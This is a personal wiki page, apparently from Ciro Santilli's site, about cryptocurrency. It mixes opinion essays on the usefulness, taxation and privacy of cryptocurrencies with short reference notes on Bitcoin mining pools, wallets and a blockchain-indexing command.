# Cryptocurrency

↑ **Parent:** [Blockchain](social-technology.md#blockchain)  
🏷️ **Tags:** [Currency](social-technology.md#currency)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Cryptocurrency)

**Table of contents**

- [Are cryptocurrencies useful?](#are-cryptocurrencies-useful)
- [Privacy coin](#privacy-coin)
  - [Privacy coin legality](#privacy-coin-legality)
    - [Privacy coin vs cryptocurrency tumbler](#privacy-coin-vs-cryptocurrency-tumbler)
- [Cryptocurrency mining](#cryptocurrency-mining)
  - [Block reward](#block-reward)
  - [Mining reward](#mining-reward)
  - [Mining pool](#mining-pool)
    - [Bitcoin mining pool](#bitcoin-mining-pool)
      - [AntPool](#antpool)
      - [Eligius pool](#eligius-pool)
      - [F2Pool](#f2pool)
      - [Horrible Horrendous Terrible Tremendous](#horrible-horrendous-terrible-tremendous)
      - [Slush Pool](#slush-pool)
- [Address (cryptocurrency)](#address-cryptocurrency)
  - [Vanity address](#vanity-address)
    - [Vanity number](#vanity-number)
    - [Vanity plate](#vanity-plate)
- [List of cryptocurrencies](#list-of-cryptocurrencies)
  - [Bitcoin](#bitcoin)
    - [Bitcoin hello world](#bitcoin-hello-world)
    - [Bitcoin HOWTO](#bitcoin-howto)
      - [Get Bitcoin transaction id from position in dat file](#get-bitcoin-transaction-id-from-position-in-dat-file)
      - [Get all Bitcoin transactions from and to a given address](#get-all-bitcoin-transactions-from-and-to-a-given-address)
    - [Bitcoin wallet](#bitcoin-wallet)
      - [Electrum](#electrum)
      - [Bitcoin wallet without a full node](#bitcoin-wallet-without-a-full-node)
    - [How Bitcoin works](#how-bitcoin-works)
      - [Bitcoin script](#bitcoin-script)
        - [Bitcoin script debugger](#bitcoin-script-debugger)
          - [btcdeb](#btcdeb)
        - [Puzzle script](#puzzle-script)
          - [Bitcoin hash puzzle script](#bitcoin-hash-puzzle-script)
          - [Finding unspent puzzle scripts](#finding-unspent-puzzle-scripts)
            - [BSHUNTER: Detecting and Tracing Defects of Bitcoin Scripts](#bshunter-detecting-and-tracing-defects-of-bitcoin-scripts)
        - [Bitcoin script type](#bitcoin-script-type)
          - [Multisig](#multisig)
          - [P2PKH](#p2pkh)
          - [P2SH](#p2sh)
          - [Bitcoin non-standard transaction](#bitcoin-non-standard-transaction)
            - [An overview of recent non-standard Bitcoin transactions by 0xB10C](#an-overview-of-recent-non-standard-bitcoin-transactions-by-0xb10c)
            - [Invalid Bitcoin transaction script](#invalid-bitcoin-transaction-script)
              - [OP\_INVALIDOPCODE](#op-invalidopcode)
                - [77822fd6663c665104119cb7635352756dfc50da76a92d417ec1a12c518fad69](#77822fd6663c665104119cb7635352756dfc50da76a92d417ec1a12c518fad69)
            - [Peter Todd's hash collision puzzles](#peter-todd-s-hash-collision-puzzles)
              - [Peter Todd](#peter-todd)
            - [Bitcoin script that terminates with multiple values on the stack](#bitcoin-script-that-terminates-with-multiple-values-on-the-stack)
              - [3ad6677303fb6f700a4f2f977fe86e5324e0ddb0d3b33a649e513d7e88904e85](#3ad6677303fb6f700a4f2f977fe86e5324e0ddb0d3b33a649e513d7e88904e85)
            - [Provably unspendable Bitcoin output script](#provably-unspendable-bitcoin-output-script)
              - [4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af](#4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af)
                - [a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24](#a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24)
              - [5660d06bd69326c18ec63127b37fb3b32ea763c3846b3334c51beb6a800c57d3](#5660d06bd69326c18ec63127b37fb3b32ea763c3846b3334c51beb6a800c57d3)
          - [Invalid Bitcoin script](#invalid-bitcoin-script)
        - [Bitcoin script operator](#bitcoin-script-operator)
          - [OP\_RETURN](#op-return)
        - [Bitcoin input script](#bitcoin-input-script)
        - [Bitcoin output script](#bitcoin-output-script)
      - [Change (Bitcoin)](#change-bitcoin)
      - [Bitcoin mining reward](#bitcoin-mining-reward)
        - [Bitcoin halving](#bitcoin-halving)
    - [History of Bitcoin](#history-of-bitcoin)
      - [First Bitcoin transactoin](#first-bitcoin-transactoin)
      - [First mentions of bitcoin on](#first-mentions-of-bitcoin-on)
        - [First mentions of bitcoin on HackerNews](#first-mentions-of-bitcoin-on-hackernews)
        - [First mentions of bitcoin on Reddit](#first-mentions-of-bitcoin-on-reddit)
        - [First mentions of bitcoin on YouTube](#first-mentions-of-bitcoin-on-youtube)
        - [First mentions of bitcoin on public television](#first-mentions-of-bitcoin-on-public-television)
      - [Laszlo's pizzas](#laszlo-s-pizzas)
        - [Jeremy Sturdivant](#jeremy-sturdivant)
        - [Who bought Laszlo Hanyecz pizza?](#who-bought-laszlo-hanyecz-pizza)
      - [Lost Bitcoin case](#lost-bitcoin-case)
        - [James Howells](#james-howells)
        - [Stefan Thomas](#stefan-thomas)
    - [Bitcoin community](#bitcoin-community)
      - [Bitcoin Forum](#bitcoin-forum)
      - [Bitcoin IRC channel](#bitcoin-irc-channel)
      - [Bitcoin Foundation](#bitcoin-foundation)
      - [Bitcoin person](#bitcoin-person)
        - [Bitcoin developer](#bitcoin-developer)
          - [Gavin Andresen](#gavin-andresen)
          - [Luke Dashjr](#luke-dashjr)
          - [Satoshi Nakamoto](#satoshi-nakamoto)
            - [Satoshi Bitcoin address](#satoshi-bitcoin-address)
              - [Genesis block output address](#genesis-block-output-address)
            - [bitcoin.org](#bitcoin-org)
            - [First public announcement of Bitoin](#first-public-announcement-of-bitoin)
            - [Satoshi's email address](#satoshi-s-email-address)
              - [satoshin@gmx.com](#satoshin-at-gmx-com)
                - [Satoshi's 2014 email hack](#satoshi-s-2014-email-hack)
              - [satoshi@vistomail.com](#satoshi-at-vistomail-com)
                - [vistomail.com](#vistomail-com)
                  - [Alex Elbanna](#alex-elbanna)
            - [Satoshi Nakamoto candidate](#satoshi-nakamoto-candidate)
              - [Craig Steven Wright](#craig-steven-wright)
                - [Craig Steven Wright meme](#craig-steven-wright-meme)
                - [Craig Steven Wright is the Billy Mitchell of Bitcoin](#craig-steven-wright-is-the-billy-mitchell-of-bitcoin)
                - [CoinGeek](#coingeek)
            - [Adam Back](#adam-back)
              - [Hashcash](#hashcash)
            - [David Chaum](#david-chaum)
              - [ecash](#ecash)
            - [Hal Finney (computer scientist)](#hal-finney-computer-scientist)
            - [Martti Malmi](#martti-malmi)
            - [Nick Szabo](#nick-szabo)
              - [bit gold](#bit-gold)
            - [Wei Dai](#wei-dai)
              - [b-money](#b-money)
            - [Bitcoin whitepaper](#bitcoin-whitepaper)
        - [Bitcoin miner](#bitcoin-miner)
          - [Eric Elliot](#eric-elliot)
        - [Bitcoin entrepreneur](#bitcoin-entrepreneur)
        - [Bitcoin investor](#bitcoin-investor)
          - [Erik Finman](#erik-finman)
            - [Erik Finman thinks school is broken](#erik-finman-thinks-school-is-broken)
          - [Davinci Jeremie](#davinci-jeremie)
    - [Sup!? (P2FK client)](#sup-p2fk-client)
    - [Bitcoin protocol](#bitcoin-protocol)
      - [Bitcoin protocol data type](#bitcoin-protocol-data-type)
        - [Bitcoin varint](#bitcoin-varint)
      - [Bitcoin transaction](#bitcoin-transaction)
        - [Bitcoin address](#bitcoin-address)
          - [Bitcoin vanity address](#bitcoin-vanity-address)
            - [Bitcoin 2011 vanity address pool](#bitcoin-2011-vanity-address-pool)
          - [List of Bitcoin addresses](#list-of-bitcoin-addresses)
            - [1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS](#1mvpqja7ftcdrwkc6zatkzvzcxqma4jixs)
        - [Coinbase transaction](#coinbase-transaction)
          - [Coinbase message](#coinbase-message)
      - [Bitcoin block](#bitcoin-block)
        - [List of bitcoin blocks](#list-of-bitcoin-blocks)
          - [Genesis block](#genesis-block)
            - [Genesis block message](#genesis-block-message)
            - [Satoshi tribute](#satoshi-tribute)
          - [First block not mined by Satoshi](#first-block-not-mined-by-satoshi)
    - [Bitcoin implementation](#bitcoin-implementation)
      - [Bitcoin blockchain parser](#bitcoin-blockchain-parser)
        - [python-bitcoin-blockchain-parser](#python-bitcoin-blockchain-parser)
      - [Bitcoin Core](#bitcoin-core)
        - [Bitcoin Core executable](#bitcoin-core-executable)
          - [Bitcoin daemon](#bitcoin-daemon)
            - [Bitcoin RPC command](#bitcoin-rpc-command)
              - [Bitcoin `getrawtransaction` command](#bitcoin-getrawtransaction-command)
          - [Bitcoin CLI client](#bitcoin-cli-client)
          - [Bitcoin Core snap](#bitcoin-core-snap)
          - [Bitcoin Core data layout](#bitcoin-core-data-layout)
            - [Bitcoin Core txindex](#bitcoin-core-txindex)
    - [How to store data in the Bitcoin blockchain](#how-to-store-data-in-the-bitcoin-blockchain)
    - [How to extract data from the Bitcoin blockchain](#how-to-extract-data-from-the-bitcoin-blockchain)
      - [Blockchain explorer](#blockchain-explorer)
        - [Blockchain SQL explorer](#blockchain-sql-explorer)
        - [Blockchain explorer website](#blockchain-explorer-website)
          - [Blockchair](#blockchair)
          - [Blockchain.info](#blockchain-info)
      - [Bitcoin Inscription Indexer](#bitcoin-inscription-indexer)
      - [BitcoinStrings.com](#bitcoinstrings-com)
      - [Satoshi uploader](#satoshi-uploader)
        - [Peter Todd's data upload scripts](#peter-todd-s-data-upload-scripts)
      - [Bitcoin blockchain `j(` upload system](#bitcoin-blockchain-j-upload-system)
    - [Services based on Bitcoin](#services-based-on-bitcoin)
      - [Satoshi Dice](#satoshi-dice)
    - [Bitcoin inscription](#bitcoin-inscription)
      - [Cool data embedded in the Bitcoin blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md)
        - [Media type](cool-data-embedded-in-the-bitcoin-blockchain.md#media-type)
          - [Images](cool-data-embedded-in-the-bitcoin-blockchain.md#images)
            - [ASCII art](cool-data-embedded-in-the-bitcoin-blockchain.md#ascii-art)
              - [Len Sassaman tribute](cool-data-embedded-in-the-bitcoin-blockchain.md#len-sassaman-tribute)
              - [Marijuana plant](cool-data-embedded-in-the-bitcoin-blockchain.md#marijuana-plant)
              - [Force of Will](cool-data-embedded-in-the-bitcoin-blockchain.md#force-of-will)
            - [Custom encoded images of unknown source](cool-data-embedded-in-the-bitcoin-blockchain.md#custom-encoded-images-of-unknown-source)
            - [AtomSea & EMBII](cool-data-embedded-in-the-bitcoin-blockchain.md#atomsea-and-embii)
              - [Early AtomSea & EMBII uploads](cool-data-embedded-in-the-bitcoin-blockchain.md#early-atomsea-and-embii-uploads)
                - [ILoveYouMore.jpg](cool-data-embedded-in-the-bitcoin-blockchain.md#iloveyoumore-jpg)
                - [Nelson-Mandela.jpg](cool-data-embedded-in-the-bitcoin-blockchain.md#nelson-mandela-jpg)
                  - [Nelson-Mandela.jpg analysis](cool-data-embedded-in-the-bitcoin-blockchain.md#nelson-mandela-jpg-analysis)
              - [Interesting AtomSea & EMBII uploads](cool-data-embedded-in-the-bitcoin-blockchain.md#interesting-atomsea-and-embii-uploads)
              - [AtomSea & EMBII data format](cool-data-embedded-in-the-bitcoin-blockchain.md#atomsea-and-embii-data-format)
              - [bitfossil.org](cool-data-embedded-in-the-bitcoin-blockchain.md#bitfossil-org)
            - [Raw images](cool-data-embedded-in-the-bitcoin-blockchain.md#raw-images)
              - [cryptograffiti.info](cool-data-embedded-in-the-bitcoin-blockchain.md#cryptograffiti-info)
            - [Ordinal ruleset inscription](cool-data-embedded-in-the-bitcoin-blockchain.md#ordinal-ruleset-inscription)
              - [ordinals.com](cool-data-embedded-in-the-bitcoin-blockchain.md#ordinals-com)
              - [Ordinal ruleset inscription porn](cool-data-embedded-in-the-bitcoin-blockchain.md#ordinal-ruleset-inscription-porn)
              - [Technically interesting ordinal](cool-data-embedded-in-the-bitcoin-blockchain.md#technically-interesting-ordinal)
                - [Largest ordinal inscription](cool-data-embedded-in-the-bitcoin-blockchain.md#largest-ordinal-inscription)
                  - [Largest text ordinal inscription](cool-data-embedded-in-the-bitcoin-blockchain.md#largest-text-ordinal-inscription)
                    - [Ordinal ASCII art inscription](cool-data-embedded-in-the-bitcoin-blockchain.md#ordinal-ascii-art-inscription)
                      - [We are 256, We are 1](cool-data-embedded-in-the-bitcoin-blockchain.md#we-are-256-we-are-1)
                - [Cursed ordinal](cool-data-embedded-in-the-bitcoin-blockchain.md#cursed-ordinal)
              - [Ordinal ruleset inscription collection](cool-data-embedded-in-the-bitcoin-blockchain.md#ordinal-ruleset-inscription-collection)
                - [OnChainMonkey](cool-data-embedded-in-the-bitcoin-blockchain.md#onchainmonkey)
                - [Taproot Wizards](cool-data-embedded-in-the-bitcoin-blockchain.md#taproot-wizards)
          - [Text](cool-data-embedded-in-the-bitcoin-blockchain.md#text)
            - [Software](cool-data-embedded-in-the-bitcoin-blockchain.md#software)
            - [Cute Coinbase messages](cool-data-embedded-in-the-bitcoin-blockchain.md#cute-coinbase-messages)
              - [HHTT](cool-data-embedded-in-the-bitcoin-blockchain.md#hhtt)
            - [Base58 messages](cool-data-embedded-in-the-bitcoin-blockchain.md#base58-messages)
              - [etchablock.com](cool-data-embedded-in-the-bitcoin-blockchain.md#etchablock-com)
            - [Eternity Wall](cool-data-embedded-in-the-bitcoin-blockchain.md#eternity-wall)
            - [Quotes and threes](cool-data-embedded-in-the-bitcoin-blockchain.md#quotes-and-threes)
          - [Encrypted data](cool-data-embedded-in-the-bitcoin-blockchain.md#encrypted-data)
        - [Themes](cool-data-embedded-in-the-bitcoin-blockchain.md#themes)
          - [Prayer wars](cool-data-embedded-in-the-bitcoin-blockchain.md#prayer-wars)
          - [Illegal content of block 229k](cool-data-embedded-in-the-bitcoin-blockchain.md#illegal-content-of-block-229k)
          - [Porn](cool-data-embedded-in-the-bitcoin-blockchain.md#porn)
            - [ASCII porn](cool-data-embedded-in-the-bitcoin-blockchain.md#ascii-porn)
          - [Mt. Gox' shutdown](cool-data-embedded-in-the-bitcoin-blockchain.md#mt-gox-shutdown)
          - [Protests against larger block sizes](cool-data-embedded-in-the-bitcoin-blockchain.md#protests-against-larger-block-sizes)
            - [IRC log dumps](cool-data-embedded-in-the-bitcoin-blockchain.md#irc-log-dumps)
          - [503: Bitcoin over capacity](cool-data-embedded-in-the-bitcoin-blockchain.md#503-bitcoin-over-capacity)
          - [Rickrolling](cool-data-embedded-in-the-bitcoin-blockchain.md#rickrolling)
          - [Halving messages](cool-data-embedded-in-the-bitcoin-blockchain.md#halving-messages)
          - [Politics](cool-data-embedded-in-the-bitcoin-blockchain.md#politics)
            - [China](cool-data-embedded-in-the-bitcoin-blockchain.md#china)
            - [Trump](cool-data-embedded-in-the-bitcoin-blockchain.md#trump)
        - [Interesting transactions](cool-data-embedded-in-the-bitcoin-blockchain.md#interesting-transactions)
          - [The largest transactions in the Bitcoin Blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md#the-largest-transactions-in-the-bitcoin-blockchain)
        - [Bibliography](cool-data-embedded-in-the-bitcoin-blockchain.md#bibliography)
          - [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](cool-data-embedded-in-the-bitcoin-blockchain.md#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014)
          - [A Quantitative Analysis of the Impact of Arbitrary Blockchain Content on Bitcoin by Matzutt et al. (2018)](cool-data-embedded-in-the-bitcoin-blockchain.md#a-quantitative-analysis-of-the-impact-of-arbitrary-blockchain-content-on-bitcoin-by-matzutt-et-al-2018)
          - [Messages from the mines](cool-data-embedded-in-the-bitcoin-blockchain.md#messages-from-the-mines)
          - [Bitcoin Burn Addresses: Unveiling the Permanent Losses and Their Underlying Causes](cool-data-embedded-in-the-bitcoin-blockchain.md#bitcoin-burn-addresses-unveiling-the-permanent-losses-and-their-underlying-causes)
        - [Other blockchains](cool-data-embedded-in-the-bitcoin-blockchain.md#other-blockchains)
        - [Incoming links](cool-data-embedded-in-the-bitcoin-blockchain.md#incoming-links)
      - [Bitcoin inscription bibliography](#bitcoin-inscription-bibliography)
        - [Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl](#data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl)
        - [A Quantitative Analysis of the Impact of Arbitrary Blockchain Content on Bitcoin](#a-quantitative-analysis-of-the-impact-of-arbitrary-blockchain-content-on-bitcoin)
        - [A Journey into Bitcoin Metadata by Livio Pompianu](#a-journey-into-bitcoin-metadata-by-livio-pompianu)
      - [Bitcoin inscription method](#bitcoin-inscription-method)
        - [Fake P2PKH address](#fake-p2pkh-address)
        - [Pay-to-Fake-Multisig](#pay-to-fake-multisig)
        - [Two-stage P2SH inscription](#two-stage-p2sh-inscription)
        - [Daisy chain Bitcoin inscription](#daisy-chain-bitcoin-inscription)
        - [Input script inscription](#input-script-inscription)
      - [Bitcoin miner inscription](#bitcoin-miner-inscription)
  - [Ethereum](#ethereum)
  - [Cardano](#cardano)
    - [Ouroboros (protocol)](#ouroboros-protocol)
  - [Monero](#monero)
    - [Monero Chan](#monero-chan)
    - [How to mine Monero](#how-to-mine-monero)
    - [Monero mining](#monero-mining)
      - [Monero ASIC resistance](#monero-asic-resistance)
        - [Monero GPU mining](#monero-gpu-mining)
      - [RandomX](#randomx)
    - [Monero community](#monero-community)
      - [Monero Core Team](#monero-core-team)
        - [Riccardo Spagni](#riccardo-spagni)
      - [DontTraceMeBruh](#donttracemebruh)
  - [Namecoin](#namecoin)
- [Cryptocurrency exchange](#cryptocurrency-exchange)
  - [P2P cryptocurrency exchange](#p2p-cryptocurrency-exchange)
    - [AgoraDesk](#agoradesk)
  - [Decentralized exchange](#decentralized-exchange)
    - [Serai DEX](#serai-dex)
      - [Serai DEX clearcoin traceability](#serai-dex-clearcoin-traceability)
    - [THORSwap](#thorswap)
  - [Off-chain transaction](#off-chain-transaction)
  - [Cryptocurrency swapper](#cryptocurrency-swapper)
    - [SimpleSwap](#simpleswap)
  - [List of cryptocurrency exchanges](#list-of-cryptocurrency-exchanges)
    - [Binance](#binance)
    - [Coinbase](#coinbase)
      - [Coinbase Bitcoin hello world](#coinbase-bitcoin-hello-world)
      - [Coinbase employee](#coinbase-employee)
        - [Olaf Carlson-Wee](#olaf-carlson-wee)
    - [Mt. Gox](#mt-gox)
      - [Jed McCaleb](#jed-mccaleb)
    - [FTX](#ftx)
      - [Caroline Ellison](#caroline-ellison)
- [Cryptocurrency tumbler](#cryptocurrency-tumbler)
- [Non-fungible token](#non-fungible-token)
  - [NFT Marketplace](#nft-marketplace)
    - [Magic Eden](#magic-eden)

## Are cryptocurrencies useful?

↑ **Parent:** [Cryptocurrency](cryptocurrency.md)

Cryptocurrencies have two applications:
- [illegal](law.md) activities, notably buying [drugs](biology.md#drug), paying for [ransomware](software.md#ransomware) and [money laundering](economy.md#money-laundering). But also paying for anti-[censorship](law.md#censorship) services from inside [dictatorships](social-technology.md#dictatorship). Illegal activity can be good when governments are bad, and arguably selling drugs should be legal.

  For this reason [Ciro Santilli](ciro-santilli.md) believes that [privacy coins](#privacy-coin) like [Monero](#monero) are currently the most useful cryptocurrencies. Also, people concerned with their privacy are likely to more naturally make fewer larger payments to reduce exposure rather than a bunch of small separate ones, and therefore transaction fees matter less, and can be seen as a reasonable privacy [tax](social-technology.md#tax). Also drugs are expensive, just have a look at any [uncensored Onion service search engine](cryptography.md#uncensored-onion-service-search-engine), so individual transactions tend to be large.
- [inflation](economy.md#inflation)-resistance due to [money creation](economy.md#money-creation) in [fiat currencies](social-technology.md#fiat-currency). [Money printing is a bad form of tax](economy.md#money-creation-vs-tax). But why not just instead invest in bonds or [stocks](economy.md#stock-market), which actually have a specific intrinsic value and should therefore increase your capital and beat inflation? Even if crypto did take over, its value would eventually become constant, and just holding it would lose out to stocks and bonds. And pre-crypto, salaries should adjust relatively quickly to new inflation levels as they come, though there is always some delay. Also, for non-anonymous cryptocurrencies, governments will sooner or later find a way to regulate and pervert it. If you want to do things without anonymity, then what you really have to fight for is to change government itself, perhaps with a [DAO](https://ourbigbook.com/go/topic/dao)-like approach, or pushing for a more [direct democracy](social-technology.md#direct-democracy).

The key difficulties of cryptocurrencies are:
- how do transaction fees/guarantees/times compare to centralized systems such as credit cards:
  - [https://bitcoin.stackexchange.com/questions/1261/is-it-possible-to-send-bitcoins-without-paying-a-fee](https://bitcoin.stackexchange.com/questions/1261/is-it-possible-to-send-bitcoins-without-paying-a-fee) "The Blockchain Scalability Problem & the Race for Visa-Like Transaction Speed" (2019)

    > The battle for a scalable solution is the blockchain's moon race. Bitcoin processes 4.6 transactions per second. Visa does around 1,700 transactions per second on average (based on a calculation derived from the official claim of over 150 million transactions per day).
  - [https://towardsdatascience.com/the-blockchain-scalability-problem-the-race-for-visa-like-transaction-speed-5cce48f9d44](https://towardsdatascience.com/the-blockchain-scalability-problem-the-race-for-visa-like-transaction-speed-5cce48f9d44)
  Obviously, decentralized currencies cannot be cheaper to maintain than centralized ones, since with decentralization you still have to send network messages at all times, and instead of one party carrying out computations, multiple parties have to carry out computations.

  Crypto could however be close enough in price to centralized systems that it becomes viable, this can be considered.
- how can [governments](social-technology.md#government) [tax](social-technology.md#tax) cryptocurrency. Notably, because:
  - taxation has to be [progressive](social-technology.md#progressive-tax), e.g. [we have to tax the rich more than the poor](social-technology.md#wealth-tax), and [anonymity](cryptography.md#anonymity) in transactions would weaken that
  - it would be even easier to move money into [fiscal paradises](social-technology.md#fiscal-paradise), and then just say, oops, lost my passwords, those coins are actually gone

  See also [globalization reduces the power of governments](science.md#globalization-reduces-the-power-of-governments).

If crypto really takes off, 99.99% of people will still only ever use it through some [cryptocurrency exchange](#cryptocurrency-exchange) (unless scalability problems are solved, and they replace [fiat currencies](social-technology.md#fiat-currency) entirely), since downloading full blockchains is unfeasible, so the outcome would be very similar to [PayPal](economy.md#paypal), and without "true" decentralization.

For those reasons, [Ciro Santilli](ciro-santilli.md) instead believes that governments should issue [electronic money](social-technology.md#electronic-money), and maintain an open [API](software.md#application-programming-interface) that all can access instead. The centralized service will always be cheaper for [society](science.md#society) to maintain than any distributed service, and it will still allow for proper taxation.

Ciro believes that it is easy for people to be seduced by the [idealistic](science.md#idealism) promise that "cryptocurrency will make the world more fair and equal by giving everyone equal opportunities, away from the corruption of Governments". Such optimism that new [technologies](technology.md) will solve certain key [social](science.md#society) problems without the need for constant [government](social-technology.md#government) intervention and management is not new, as shown e.g. at [HyperNormalisation by Adam Curtis (2016)](film.md#hypernormalisation-by-adam-curtis-2016) when he talks about the cyberspace (when the [Internet](computer.md#internet) was just beginning): [https://youtu.be/fh2cDKyFdyU?t=2375](https://youtu.be/fh2cDKyFdyU?t=2375). Technologies can make our lives better. But in general, some of them also have to be managed.

In any case, cryptocurrencies are [bullshit](molecular-biology.md#bullshit), the true currency of the future is going to be [Magic: The Gathering](magic-the-gathering.md) cards. And [Cirocoin](cirism.md#cirocoin).

One closely related thing that Ciro Santilli does think could be interesting exploring right now however, notably when having [Monero](#monero)-like anonymity in mind, would be anonymous [electronic voting](social-technology.md#electronic-voting), which is a pre-requisite to make [direct democracy](social-technology.md#direct-democracy) convenient so people can vote more often.

TODO evaluate the possible application of cryptocurrency for international transfers:
- [https://bitcoin.stackexchange.com/questions/25583/does-it-make-sense-to-use-bitcoin-to-transfer-money-to-yourself-internationally](https://bitcoin.stackexchange.com/questions/25583/does-it-make-sense-to-use-bitcoin-to-transfer-money-to-yourself-internationally)
Of course, the ideal solution would be for governments to just allow for people from other countries to create accounts in their country, and use the centralized API just like citizens. Having an account of some sort is of course fundamental to avoid money laundering/tax evasion, be it on the API, or when you are going to cash out the crypto into [fiat](social-technology.md#fiat-currency). So then the question becomes: suppose that governments are shit and never make such APIs, are international transfers just because traditional banks are inefficient/greedy? Or is it because of the inevitable cost of auditing transfers? E.g. how does [TransferWise](economy.md#transferwise) compare to Bitcoin these days? And if cryptocurrency is more desirable, why wouldn't [TransferWise](economy.md#transferwise) just use it as their backend, and reach very similar fees?

## Privacy coin

↑ **Parent:** [Cryptocurrency](cryptocurrency.md)

Notable ones:
- [Monero](#monero)

### Privacy coin legality

↑ **Parent:** [Privacy coin](#privacy-coin)

#### Privacy coin vs cryptocurrency tumbler

↑ **Parent:** [Privacy coin legality](#privacy-coin-legality)

In 2024 they started making tumblers illegal:
- [https://www.reddit.com/r/CryptoCurrency/comments/163qjnw/why_is_tornado_cash_creator_criminalized_and/](https://www.reddit.com/r/CryptoCurrency/comments/163qjnw/why_is_tornado_cash_creator_criminalized_and/)
- [https://www.justice.gov/usao-sdny/pr/founders-and-ceo-cryptocurrency-mixing-service-arrested-and-charged-money-laundering](https://www.justice.gov/usao-sdny/pr/founders-and-ceo-cryptocurrency-mixing-service-arrested-and-charged-money-laundering)
So why [privacy coins](#privacy-coin) weren't fully forbidden then?

## Cryptocurrency mining

↑ **Parent:** [Cryptocurrency](cryptocurrency.md)

### Block reward

↑ **Parent:** [Cryptocurrency mining](#cryptocurrency-mining)

### Mining reward

↑ **Parent:** [Cryptocurrency mining](#cryptocurrency-mining)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Mining_reward)

### Mining pool

↑ **Parent:** [Cryptocurrency mining](#cryptocurrency-mining)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Mining_pool)

#### Bitcoin mining pool

↑ **Parent:** [Mining pool](#mining-pool)

##### AntPool

↑ **Parent:** [Bitcoin mining pool](#bitcoin-mining-pool)

[https://en.bitcoin.it/wiki/AntPool](https://en.bitcoin.it/wiki/AntPool)

##### Eligius pool

↑ **Parent:** [Bitcoin mining pool](#bitcoin-mining-pool)

[https://en.bitcoin.it/wiki/Eligius](https://en.bitcoin.it/wiki/Eligius)

Created by [Luke Dashjr](#luke-dashjr).

The pool is named after Saint Eligius, patron of miners[https://twitter.com/LukeDashjr/status/1749183638313246875](https://twitter.com/LukeDashjr/status/1749183638313246875)

Eligius also means to "choose" or "chosen" in [Latin](linguistics.md#latin): [https://en.wiktionary.org/wiki/Eligius](https://en.wiktionary.org/wiki/Eligius), same root as "to elect" in modern [English](linguistics.md#english-language) presumably. 

<a id="image-saint-eligius-by-petrus-christus-eligius-pool"></a>
![](https://upload.wikimedia.org/wikipedia/commons/1/11/Petrus_Christus_003.jpg)

**[Figure 1](#image-saint-eligius-by-petrus-christus-eligius-pool). Saint Eligius by Petrus Christus**. [Source](https://commons.wikimedia.org/wiki/File:Petrus_Christus_003.jpg). Eligius pool is named after [Saint Eligius](religion.md#saint-eligius), patron of goldsmiths and miners[https://twitter.com/LukeDashjr/status/1749183638313246875](https://twitter.com/LukeDashjr/status/1749183638313246875)

##### F2Pool

↑ **Parent:** [Bitcoin mining pool](#bitcoin-mining-pool)

[https://www.f2pool.com/](https://www.f2pool.com/)

##### Horrible Horrendous Terrible Tremendous

↑ **Parent:** [Bitcoin mining pool](#bitcoin-mining-pool)

[http://hhtt.1209k.com/](http://hhtt.1209k.com/)

They might have shut down, but they still have the cutest name! And they've made some cute [inscriptions](social-technology.md#inscription-blockchain) too, see: [HHTT](cool-data-embedded-in-the-bitcoin-blockchain.md#hhtt)

##### Slush Pool

↑ **Parent:** [Bitcoin mining pool](#bitcoin-mining-pool)

[https://en.bitcoin.it/wiki/Slush_Pool](https://en.bitcoin.it/wiki/Slush_Pool)

## Address (cryptocurrency)

↑ **Parent:** [Cryptocurrency](cryptocurrency.md)

### Vanity address

↑ **Parent:** [Address (cryptocurrency)](#address-cryptocurrency)

[https://bitcoin.stackexchange.com/questions/20305/what-is-vanity-address](https://bitcoin.stackexchange.com/questions/20305/what-is-vanity-address)

#### Vanity number

↑ **Parent:** [Vanity address](#vanity-address)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Vanity_number)

#### Vanity plate

↑ **Parent:** [Vanity address](#vanity-address)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Vanity_plate)

## List of cryptocurrencies

↑ **Parent:** [Cryptocurrency](cryptocurrency.md)

### Bitcoin

↑ **Parent:** [List of cryptocurrencies](#list-of-cryptocurrencies)  
ⓦ [Wiki](https://en.wikipedia.org/wiki/Bitcoin)

How it works: [Section "How Bitcoin works"](#how-bitcoin-works).

Official website: [https://bitcoin.org/en/](https://bitcoin.org/en/)

Reference implementation: [Bitcoin Core](#bitcoin-core).

#### Bitcoin hello world

↑ **Parent:** [Bitcoin](#bitcoin)

- buy some at a [cryptocurrency exchange](#cryptocurrency-exchange). This is the only viable way of obtaining crypto nowadays, since basically all cryptocurrencies require specialized hardware to mine.
- send it to a self hosted [Bitcoin wallet without a full node](#bitcoin-wallet-without-a-full-node), e.g. [Electrum](#electrum)
- then send something out of the wallet back to the exchange wallet!
- convert the crypto back to cash

E.g.: [Coinbase Bitcoin hello world](#coinbase-bitcoin-hello-world).

#### Bitcoin HOWTO

↑ **Parent:** [Bitcoin](#bitcoin)

##### Get Bitcoin transaction id from position in dat file

↑ **Parent:** [Bitcoin HOWTO](#bitcoin-howto)

Suppose we specify:
- a .dat file
- the offset in bytes within that file
The question then is, which transaction is encoded at that position of the file?

This would allow us to index inscriptions in the .dat files directly with fast C tools, and then retrive the transaction ID to get cleaner data and metadata.

It should be possible if we managed to take the information from [https://bitcoindev.network/understanding-the-data/](https://bitcoindev.network/understanding-the-data/) and dump into an indexed [SQLite](sql.md#sqlite) database.

I tried to start things off with [LevelDBDumper](software.md#leveldbdumper):
```
LevelDBDumper -d ~/snap/bitcoin-core/common/.bitcoin/indexes/txindex -f btc.csv -q -o . -t csv
```
but that consumed all 64 GB of RAM on [P51](ciro-santilli-s-hardware.md#lenovo-thinkpad-p51-2017)... [https://github.com/mdawsonuk/LevelDBDumper/issues/15](https://github.com/mdawsonuk/LevelDBDumper/issues/15)

